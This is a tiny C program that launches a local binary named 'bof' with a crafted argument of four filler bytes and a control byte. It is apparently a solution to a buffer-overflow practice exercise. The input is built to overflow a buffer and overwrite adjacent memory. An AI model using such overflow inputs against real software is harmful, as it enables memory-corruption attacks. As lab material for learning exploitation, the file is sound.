#include <stdio.h>
#include <unistd.h>
int main(int argc, char** argv) {
    char* argv2[] = {"bof", "aaaa\x01", NULL};
    execv("./bof",argv2);
    return 0;
}
